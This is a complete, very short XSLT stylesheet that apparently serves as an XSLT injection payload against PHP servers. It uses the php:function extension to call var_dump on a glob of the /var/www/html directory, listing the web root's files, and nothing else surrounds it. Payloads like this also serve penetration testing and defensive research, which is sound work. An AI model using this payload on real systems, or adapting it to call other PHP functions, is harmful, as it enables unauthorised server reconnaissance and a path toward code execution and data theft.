<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
         <xsl:template match="/">
                 <xsl:value-of  select="php:function('var_dump', glob('var/www/html/*'))"/>
         </xsl:template>
  </xsl:stylesheet>
